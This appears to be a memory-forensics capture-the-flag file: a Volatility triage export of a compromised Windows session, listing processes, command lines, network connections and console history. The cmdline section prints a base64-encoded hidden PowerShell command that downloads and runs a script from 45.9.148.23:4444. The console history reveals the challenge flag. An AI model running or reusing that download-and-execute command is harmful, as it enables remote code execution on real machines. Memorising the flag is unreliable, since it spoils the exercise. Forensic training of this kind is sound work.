@@ -1,0 +1,83 @@
+Case 2026-1103 - triage export
+Source     : memory dump leader-wks.mem (acquired 2026-11-03 09:41 UTC)
+Tool       : Volatility 2.6.1, profile Win7SP1x64
+Exported by: IR team alpha
+NOTE: full dump unavailable after imaging fault - this export is the evidence.
+
+================================================================
+[1] pslist (excerpt)
+================================================================
+Offset(V)          Name                    PID   PPID   Thds   Hnds  Start
+------------------ -------------------- ------ ------ ------ ------ -------------------
+0xfffffa80003a7040 System                    4      0     99    506  2026-11-03 07:12:52
+0xfffffa800159c890 smss.exe                292      4      2     32  2026-11-03 07:12:52
+0xfffffa8002bcc850 wininit.exe             440    360      3     79  2026-11-03 07:12:53
+0xfffffa8002c67b30 services.exe            544    440     10    196  2026-11-03 07:12:53
+0xfffffa8002c7b550 lsass.exe               556    440      6    554  2026-11-03 07:12:53
+0xfffffa8002cdc2c0 svchost.exe             656    544     12    362  2026-11-03 07:12:54
+0xfffffa8002caf530 VBoxService.ex          724    544     14    132  2026-11-03 07:12:54
+0xfffffa8002d7f830 svchost.exe             960    544     37    963  2026-11-03 07:12:54
+0xfffffa8002d79b30 svchost.exe             928    544     21    445  2026-11-03 07:12:54
+0xfffffa8002dc4960 svchost.exe             412    544     13    299  2026-11-03 07:12:55
+0xfffffa8002f07b30 svchost.exe            1348    544     16    271  2026-11-03 07:12:56
+0xfffffa8002b12410 taskhost.exe           1816    544     10    161  2026-11-03 07:19:01
+0xfffffa8002c36b30 SearchIndexer.         1820    544     16    662  2026-11-03 07:15:05
+0xfffffa80030d7b30 dwm.exe                2104    928      4     92  2026-11-03 07:19:02
+0xfffffa8003228a10 explorer.exe           2212   1804     29   1021  2026-11-03 07:19:03
+0xfffffa80035a1c40 VBoxTray.exe           2364   2212      9    141  2026-11-03 07:19:05
+0xfffffa80036b2e10 taskmgr.exe            2488   2212      7    190  2026-11-03 08:44:11
+0xfffffa8003714f20 firefox.exe            3108   2212     48   1452  2026-11-03 07:31:48
+0xfffffa80038a6d30 notepad.exe            2904   2212      3     62  2026-11-03 08:50:23
+0xfffffa8003938e40 ivkui.exe              3472   2212      6     98  2026-11-03 09:12:07
+0xfffffa80039d1f50 powershell.exe         3596   3472      2     33  2026-11-03 09:12:09
+0xfffffa8003a5060 WUDFHost.exe           3704    544      5    102  2026-11-03 09:30:41
+
+================================================================
+[2] pstree (excerpt, suspicious subtree)
+================================================================
+ 0xfffffa8003228a10:explorer.exe      2212   1804   2026-11-03 07:19:03
+. 0xfffffa80035a1c40:VBoxTray.exe     2364   2212   2026-11-03 07:19:05
+. 0xfffffa80036b2e10:taskmgr.exe      2488   2212   2026-11-03 08:44:11
+. 0xfffffa8003714f20:firefox.exe      3108   2212   2026-11-03 07:31:48
+. 0xfffffa80038a6d30:notepad.exe      2904   2212   2026-11-03 08:50:23
+. 0xfffffa8003938e40:ivkui.exe        3472   2212   2026-11-03 09:12:07
+.. 0xfffffa80039d1f50:powershell.exe  3596   3472   2026-11-03 09:12:09
+================================================================
+[3] cmdline (filtered)
+================================================================
+ivkui.exe        PID 3472
+Command line : C:\Users\mira\AppData\Roaming\ivkui.exe
+
+powershell.exe   PID 3596
+Command line : powershell.exe -NoP -W Hidden -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vNDUuOS4xNDguMjM6NDQ0NC9hLnBzMScp
+
+firefox.exe      PID 3108
+Command line : "C:\Program Files\Mozilla Firefox\firefox.exe"
+
+notepad.exe      PID 2904
+Command line : C:\Windows\system32\NOTEPAD.EXE C:\Users\mira\Desktop\notes.txt
+================================================================
+[4] netscan (TCP only, filtered)
+================================================================
+Offset(P)     Proto  Local Address         Foreign Address       State         Pid   Owner
+------------- ------ --------------------- --------------------- ------------- ----- --------------
+0xa34d90      TCPv4  0.0.0.0:49154         0.0.0.0:0             LISTENING     960   svchost.exe
+0xb12f40      TCPv4  192.168.0.52:49188    93.184.216.34:80      CLOSE_WAIT    3108  firefox.exe
+0xc77a10      TCPv4  192.168.0.52:49202    45.9.148.23:8080      CLOSE_WAIT    3472  ivkui.exe
+0xd01e70      TCPv4  192.168.0.52:49217    45.9.148.23:4444      ESTABLISHED   3596  powershell.exe
+0xd34c20      TCPv4  192.168.0.52:49231    185.199.108.133:443   ESTABLISHED   3108  firefox.exe
+0xd9015b      TCPv4  0.0.0.0:49155         0.0.0.0:0             LISTENING     412   svchost.exe
+================================================================
+[5] consoles - command history (cmd.exe, mira session)
+================================================================
+C:\Users\mira> whoami
+desktop-abcdef\mira
+C:\Users\mira> tasklist | findstr ivk
+ivkui.exe                    3472 Console                    1     13,532 K
+C:\Users\mira> netstat -ano | findstr 4444
+  TCP    192.168.0.52:49217    45.9.148.23:4444     ESTABLISHED     3596
+C:\Users\mira> echo staging note: do not lose the handover token again
+C:\Users\mira> echo handover token: ctf{tr14g3_c0rr3l4t10n}
+C:\Users\mira> del staging.txt
+
+--- end of export ---
